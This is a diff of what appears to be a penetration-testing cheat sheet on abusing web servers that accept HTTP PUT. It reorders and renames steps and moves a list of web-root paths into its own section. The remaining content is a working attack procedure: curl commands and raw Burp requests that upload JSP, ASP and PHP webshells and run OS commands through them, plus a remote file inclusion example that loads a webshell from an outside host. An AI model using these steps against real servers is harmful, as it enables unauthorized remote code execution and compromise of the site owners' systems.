@@ -251,22 +251,11 @@ Example 2 - Kentico
             < Server: lighttpd/1.4.28
             < 
             * Connection #0 to host x.x.x.x left intact
-
-➤ Step 2. Identify the DocumentRoot directory (Web root folder)
-          Examples:
-          - XAMP (Windows) = "c:\XAMPP\htdocs"
-          - IIS (Windows) = "C:\inetpub\wwwroot"
-          - Websphere (Windows) = "c:/program files/ibm http server/htdocs" or "C:\WebSphere\IHS"
-          - Apache(Linux) = '/var/www' (configuration found in the file '/etc/httpd/conf/httpd.conf' or '/etc/apache2/sites-available/default')
-          - Apache(Linux) = "/var/www/html/example.com/"
-          - Apache(Unix) = “/usr/local/Apache2.2/htdocs”
-          - Apache(Windows) =  “C:/Program Files/Apache Software Foundation/Apache2.2/htdocs/”
-          - NGINX (Linux) = '/data/www' or '/data/w3' or "/usr/local/nginx/html' (configuration files can be found in the directory: '/usr/local/nginx/conf' or /etc/nginx' or '/usr/local/etc/nginx')
 		 
-➤ Step 3. Try to upload a file with curl. 
+➤ Step 2. Try to upload a simple text file with curl 
           - curl -T test.txt http://www.sitename.com/foldername
 
-➤ Step 4. If the file was uploaded successfully, then upload any Webshell file.
+➤ Step 3. If the text file was uploaded successfully, then upload a Webshell file
 	  - Examples with CURL
             $ curl -T webshell.jsp http://www.sitename.com/<path>
             $ curl -T webshell.asp http://www.sitename.com/<path>
@@ -274,7 +263,7 @@ Example 2 - Kentico
             $ curl -T webshell.php http://www.sitename.com/<path>
 	    
 	  - Example of HTTP PUT request sent with Burp proxy (repeater)	  
-            PUT /test/RCE.php HTTP/1.1
+            PUT /test/webshell.php HTTP/1.1
             Host: x.x.x.x
             User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
             Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
@@ -294,16 +283,15 @@ Example 2 - Kentico
             Date: Wed, 15 Aug 2018 19:38:26 GMT
             Server: lighttpd/1.4.28
 
-
-➤ Step 5. Execute OS commands using the Webshell 
+➤ Step 4. Execute OS commands using the Webshell 
 	  - Examples with CURL
+            $ http://www.sitename.com/<path>/webshell.php?cmd=whoami
             $ http://www.sitename.com/<path>/webshell.jsp?cmd=whoami
             $ http://www.sitename.com/<path>/webshell.asp?cmd=whoami
-            $ http://www.sitename.com/<path>/webshell.php?cmd=whoami
 	    ...
 	  
 	  - Example of exploitation with Burp proxy (repeater)
-            GET /test/RCE.php HTTP/1.1
+            GET /test/webshell.php HTTP/1.1
             Host: x.x.x.x
             User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
             Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
@@ -340,4 +328,16 @@ Example
           Example:
           - http://Website/index.php?p=http://x.x.x.x/webshell.php
 	  - http://x.x.x.x/application/fileviewer.php?p=http://x.x.x.x/webshell
+```
+
+##### Other - List of common path for the DocumentRoot directory (Web root folder)
+```
+➤ XAMP (Windows) = "c:\XAMPP\htdocs"
+➤ IIS (Windows) = "C:\inetpub\wwwroot"
+➤ Websphere (Windows) = "c:/program files/ibm http server/htdocs" or "C:\WebSphere\IHS"
+➤ Apache(Linux) = '/var/www' (configuration found in the file '/etc/httpd/conf/httpd.conf' or '/etc/apache2/sites-available/default')
+➤ Apache(Linux) = "/var/www/html/example.com/"
+➤ Apache(Unix) = “/usr/local/Apache2.2/htdocs”
+➤ Apache(Windows) =  “C:/Program Files/Apache Software Foundation/Apache2.2/htdocs/”
+➤ NGINX (Linux) = '/data/www' or '/data/w3' or "/usr/local/nginx/html' (configuration files can be found in the directory: '/usr/local/nginx/conf' or /etc/nginx' or '/usr/local/etc/nginx')
 ```
